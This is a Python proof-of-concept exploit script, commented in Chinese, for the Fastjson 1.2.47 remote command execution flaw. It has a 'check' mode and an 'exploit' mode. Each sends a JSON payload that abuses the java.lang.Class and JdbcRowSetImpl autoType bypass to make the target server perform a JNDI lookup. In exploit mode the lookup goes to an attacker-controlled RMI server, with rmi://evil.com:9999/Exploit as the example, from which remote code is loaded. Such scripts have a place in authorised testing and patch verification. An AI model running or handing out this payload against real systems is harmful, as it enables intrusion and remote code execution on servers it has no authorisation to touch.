#!/usr/bin/env python3
"""
Fastjson 1.2.47 远程命令执行漏洞利用脚本
用法：
  检测漏洞: python poc.py -u http://target:8090 -m check
  利用(需自备RMI服务): python poc.py -u http://target:8090 -m exploit -r rmi://evil.com:9999/Exploit
依赖： pip install requests
"""

import sys
import json
import time
import argparse
import requests

class FastjsonExploit:
    def __init__(self, url, timeout=10):
        self.url = url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
            'Content-Type': 'application/json'
        })

    def check_vuln(self):
        """
        通过构造一个触发 JNDI 查找的 payload 来检测漏洞是否存在。
        使用一个不存在的 RMI 地址，观察响应时间或异常状态。
        """
        payload = {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://127.0.0.1:9999/Nonexistent",
                "autoCommit": True
            }
        }
        start = time.time()
        try:
            resp = self.session.post(self.url, json=payload, timeout=self.timeout)
            elapsed = time.time() - start
            # 如果服务端尝试连接 RMI，通常会抛出异常，返回 500
            if resp.status_code == 500 and 'JdbcRowSetImpl' in resp.text:
                return True
            # 若连接超时（RMI 不可达导致阻塞），也可能表明漏洞存在
            if elapsed > 3:  # 明显延迟
                return True
            return False
        except requests.exceptions.Timeout:
            # 超时可能是因为 JNDI 请求阻塞，漏洞很可能存在
            return True
        except Exception as e:
            print(f"[-] 请求异常: {e}")
            return False

    def exploit(self, rmi_address):
        """
        发送利用 Payload，使目标服务器连接指定的 RMI 服务。
        需要用户预先启动 RMI 服务（如使用 marshalsec）。
        """
        payload = {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": rmi_address,
                "autoCommit": True
            }
        }
        try:
            resp = self.session.post(self.url, json=payload, timeout=self.timeout)
            print(f"[*] 响应状态码: {resp.status_code}")
            # 如果成功触发漏洞，通常会返回 500 错误（JNDI 查找异常）
            if resp.status_code == 500 and 'JdbcRowSetImpl' in resp.text:
                print("[+] 漏洞似乎已触发，请检查 RMI 服务是否收到连接请求。")
            else:
                print("[*] 未检测到预期错误，请验证 RMI 服务日志。")
            print("[*] 响应内容（前 500 字符）:")
            print(resp.text[:500])
        except requests.exceptions.Timeout:
            print("[+] 请求超时，可能因为 RMI 连接阻塞，漏洞可能已触发。")
        except Exception as e:
            print(f"[-] 请求异常: {e}")

def main():
    parser = argparse.ArgumentParser(description='Fastjson 1.2.47 RCE POC')
    parser.add_argument('-u', '--url', required=True, help='目标 URL (如 http://target:8090)')
    parser.add_argument('-m', '--mode', choices=['check', 'exploit'], default='check',
                        help='模式: check 检测漏洞, exploit 利用漏洞')
    parser.add_argument('-r', '--rmi', help='RMI 服务器地址 (如 rmi://evil.com:9999/Exploit)')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时时间（秒）')
    args = parser.parse_args()

    exploit = FastjsonExploit(args.url, timeout=args.timeout)

    if args.mode == 'check':
        print("[*] 检测漏洞...")
        if exploit.check_vuln():
            print("[+] 漏洞存在！")
        else:
            print("[-] 未检测到漏洞。")
    elif args.mode == 'exploit':
        if not args.rmi:
            print("[-] 利用模式需要指定 --rmi 参数")
            sys.exit(1)
        print(f"[*] 发送利用 Payload，RMI 地址: {args.rmi}")
        exploit.exploit(args.rmi)

if __name__ == '__main__':
    main()